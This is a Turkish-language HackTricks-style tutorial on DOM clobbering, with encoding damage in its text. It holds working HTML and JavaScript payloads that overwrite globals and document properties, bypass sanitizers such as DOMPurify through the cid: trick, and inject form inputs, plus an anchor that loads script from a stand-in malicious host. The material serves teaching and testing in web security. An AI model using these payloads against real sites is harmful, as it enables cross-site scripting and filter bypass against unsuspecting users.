# Dom Clobbering

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan ileri seviyeye taÅŸÄ±yÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile Ã¶ÄŸrenin!</strong></summary>

* **Bir siber gÃ¼venlik ÅŸirketinde Ã§alÄ±ÅŸÄ±yor musunuz?** **Åirketinizi HackTricks'te reklamÄ±nÄ± yapmak ister misiniz?** veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter'da** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **Temel Bilgiler**

HTML etiketlerinde **`id`** ve **`name`** Ã¶zellikleriyle **JS baÄŸlamÄ±nda global deÄŸiÅŸkenler oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r**.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Sadece** belirli Ã¶ÄŸeler, `embed`, `form`, `iframe`, `image`, `img` ve `object` Ã¶ÄŸeleri, **name Ã¶zniteliÄŸini** kullanarak global deÄŸiÅŸkenleri **clobber** edebilir.

Ä°lginÃ§ bir ÅŸekilde, bir **form Ã¶ÄŸesi** kullanarak bir deÄŸiÅŸkeni **clobber** ettiÄŸinizde, Ã¶ÄŸenin kendisinin **`toString`** deÄŸerini alÄ±rsÄ±nÄ±z: `[object HTMLFormElement]` ancak **anchor** ile **`toString`** deÄŸeri anchor'Ä±n **`href`** deÄŸeri olacaktÄ±r. Bu nedenle, **`a`** etiketi kullanarak clobber yaparsanÄ±z, **dize olarak iÅŸlendiÄŸinde** **deÄŸeri kontrol** edebilirsiniz:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Diziler ve Ã–znitelikler

Bir dizi ve nesne Ã¶zniteliÄŸini **clobber** etmek de mÃ¼mkÃ¼ndÃ¼r:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**Bir 3. Ã¶zniteliÄŸi (Ã¶rneÄŸin x.y.z) clobberlamak** iÃ§in bir **`form`** kullanmanÄ±z gerekmektedir:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Daha fazla Ã¶zniteliÄŸi clobberlemek **daha karmaÅŸÄ±k ama hala mÃ¼mkÃ¼n**, iframeler kullanÄ±larak:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Stil etiketi, iframe'in render iÅŸlemini yapmasÄ± iÃ§in yeterli zamanÄ± vermek iÃ§in kullanÄ±lÄ±r. Bu olmadan, bir **tanÄ±msÄ±z** uyarÄ±sÄ±yla karÅŸÄ±laÅŸacaksÄ±nÄ±z.
{% endhint %}

Daha derin Ã¶znitelikleri clobberlemek iÃ§in, aÅŸaÄŸÄ±daki gibi **html kodlamasÄ±yla iframe'ler** kullanabilirsiniz:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Filtre Atlama**

Bir filtre, `document.getElementByID('x').attributes` gibi bir ÅŸey kullanarak bir dÃ¼ÄŸÃ¼mÃ¼n **Ã¶zelliklerini** dÃ¶ngÃ¼yle geÃ§iyorsa, **`.attributes`** Ã¶zniteliÄŸini **clobber** edebilir ve filtreyi **kÄ±rabilirsiniz**. **`tagName`**, **`nodeName`** veya **`parentNode`** gibi diÄŸer DOM Ã¶zellikleri de **clobberable** olabilir.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **`window.someObject`'Ä± Clobberlama**

JavaScript'te sÄ±kÃ§a ÅŸu ÅŸekilde karÅŸÄ±laÅŸÄ±lÄ±r:
```javascript
var someObject = window.someObject || {};
```
Sayfa Ã¼zerinde HTML manipÃ¼lasyonu, `someObject`'i bir DOM dÃ¼ÄŸÃ¼mÃ¼yle geÃ§ersiz kÄ±lmanÄ±za ve potansiyel olarak gÃ¼venlik aÃ§Ä±klarÄ±na neden olmanÄ±za olanak tanÄ±r. Ã–rneÄŸin, `someObject`'i kÃ¶tÃ¼ amaÃ§lÄ± bir betiÄŸe iÅŸaret eden bir baÄŸlantÄ± elemanÄ±yla deÄŸiÅŸtirebilirsiniz:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
ZararlÄ± bir kodda ÅŸu gibi bir aÃ§Ä±k bulunabilir:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Bu yÃ¶ntem, istenmeyen kodlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in betik kaynaÄŸÄ±nÄ± kullanÄ±r.

**Hile**: **`DOMPurify`**, **`cid:`** protokolÃ¼nÃ¼ kullanmanÄ±za olanak tanÄ±r, bu da **Ã§ift tÄ±rnaklarÄ± URL kodlamasÄ± yapmadÄ±ÄŸÄ± anlamÄ±na gelir**. Bu, **Ã§alÄ±ÅŸma zamanÄ±nda kodun Ã§Ã¶zÃ¼mleneceÄŸi kodlanmÄ±ÅŸ Ã§ift tÄ±rnaklarÄ± enjekte edebileceÄŸiniz** anlamÄ±na gelir. Bu nedenle, **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** gibi bir ÅŸey enjekte etmek, HTML kodlu `&quot;`'nin **Ã§alÄ±ÅŸma zamanÄ±nda Ã§Ã¶zÃ¼mleneceÄŸini** ve **Ã¶znitelik deÄŸerinden kaÃ§acaÄŸÄ±nÄ±** ve **`onerror`** olayÄ±nÄ± **oluÅŸturacaÄŸÄ±nÄ±** yapar.

BaÅŸka bir teknik, bir **`form`** Ã¶ÄŸesi kullanÄ±r. Belirli bir istemci tarafÄ± kitaplÄ±ÄŸÄ±, yeni oluÅŸturulan bir form Ã¶ÄŸesinin Ã¶zniteliklerini temizlemek iÃ§in bunlarÄ± kontrol eder. Ancak, formun iÃ§ine `id=attributes` olan bir `input` ekleyerek, Ã¶znitelikler Ã¶zelliÄŸini etkili bir ÅŸekilde Ã¼zerine yazarsÄ±nÄ±z ve temizleyicinin gerÃ§ek Ã¶zniteliklere eriÅŸmesini engellersiniz.

Bu tÃ¼r bir Ã¼zerine yazma Ã¶rneÄŸini [**bu CTF yazÄ±sÄ±nda bulabilirsiniz**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Belge nesnesi Ã¼zerine yazma

Belge Nesnesi'nin Ã¶zniteliklerini DOM Clobbering kullanarak Ã¼zerine yazmak mÃ¼mkÃ¼ndÃ¼r:

> [Belge](https://html.spec.whatwg.org/multipage/dom.html#document) arayÃ¼zÃ¼ [isimli Ã¶zellikleri destekler](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Herhangi bir anda bir [Belge](https://html.spec.whatwg.org/multipage/dom.html#document) nesnesinin desteklenen Ã¶zellik adlarÄ±, aÅŸaÄŸÄ±dakileri iÃ§erir: [aÄŸaÃ§ sÄ±rasÄ±na](https://dom.spec.whatwg.org/#concept-tree-order) gÃ¶re, katkÄ±da bulunan Ã¶ÄŸeye gÃ¶re, daha sonraki yinelenmeleri yok sayarak ve aynÄ± Ã¶ÄŸe hem ad hem de ad Ã¶zniteliÄŸi katkÄ±da bulunduÄŸunda, ad Ã¶zniteliÄŸi deÄŸerleri ad Ã¶zniteliklerinden Ã¶nce gelir:
>
> \- Ä°simsiz olmayan ad iÃ§eriÄŸi olan tÃ¼m [aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) ve [aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) Ã¶ÄŸeleri iÃ§in ad iÃ§eriÄŸi deÄŸeri ve belgeyi [kÃ¶k](https://dom.spec.whatwg.org/#concept-tree-root) olarak kullanan bir belge aÄŸaÃ§ yapÄ±sÄ±nda bulunan Ã¶ÄŸeler;\
> \
> \- Ä°simsiz olmayan [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) iÃ§eriÄŸi olan tÃ¼m [aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) Ã¶ÄŸeleri ve belgeyi [kÃ¶k](https://dom.spec.whatwg.org/#concept-tree-root) olarak kullanan bir belge aÄŸaÃ§ yapÄ±sÄ±nda bulunan Ã¶ÄŸeler;\
> \
> \- Ä°simsiz olmayan [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ve isim iÃ§eriÄŸi olan tÃ¼m [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) Ã¶ÄŸeleri ve belgeyi [kÃ¶k](https://dom.spec.whatwg.org/#concept-tree-root) olarak kullanan bir belge aÄŸaÃ§ yapÄ±sÄ±nda bulunan Ã¶ÄŸeler.

Bu teknik kullanÄ±larak yaygÄ±n olarak kullanÄ±lan **deÄŸerlerin Ã¼zerine yazabilirsiniz, Ã¶rneÄŸin `document.cookie`, `document.body`, `document.children`** ve hatta `document.querySelector` gibi Belge arayÃ¼zÃ¼ndeki yÃ¶ntemler.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## Element ezildikten sonra yazma

**`document.getElementById()`** ve **`document.querySelector()`** Ã§aÄŸrÄ±larÄ±nÄ±n sonuÃ§larÄ±, aynÄ± id Ã¶zniteliÄŸine sahip bir `<html>` veya `<body>` etiketi enjekte edilerek deÄŸiÅŸtirilebilir. Ä°ÅŸte nasÄ±l yapÄ±lacaÄŸÄ±:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
AyrÄ±ca, bu enjekte edilmiÅŸ HTML/body etiketlerini gizlemek iÃ§in stiller kullanarak, `innerText` iÃ§indeki diÄŸer metinlerin mÃ¼dahalesi engellenebilir ve bÃ¶ylece saldÄ±rÄ±nÄ±n etkinliÄŸi artÄ±rÄ±labilir:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVG araÅŸtÄ±rmalarÄ±, `<body>` etiketinin de etkili bir ÅŸekilde kullanÄ±labileceÄŸini ortaya Ã§Ä±kardÄ±:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
HTML etiketinin Chrome ve Firefox gibi tarayÄ±cÄ±larda SVG iÃ§inde Ã§alÄ±ÅŸabilmesi iÃ§in `<foreignobject>` etiketi gereklidir:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## FormlarÄ± Clobbering

BazÄ± etiketlerin iÃ§ine `form` Ã¶zniteliÄŸini belirterek bir formun iÃ§ine **yeni giriÅŸler eklemek** mÃ¼mkÃ¼ndÃ¼r. Bu yÃ¶ntemi kullanarak bir formun iÃ§ine **yeni deÄŸerler ekleyebilir** ve hatta **gÃ¶ndermek iÃ§in yeni bir dÃ¼ÄŸme** bile ekleyebilirsiniz (clickjacking veya bazÄ± `.click()` JS kodunu kÃ¶tÃ¼ye kullanma):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Daha fazla form Ã¶zniteliÄŸi iÃ§in [**burayÄ± kontrol edin**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Bir hacker gibi dÃ¼ÅŸÃ¼nmeyi Ã¶ÄŸrenin.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanlÄ±k seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± yapmak** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da beni takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **gÃ¶ndererek paylaÅŸÄ±n.**

</details>
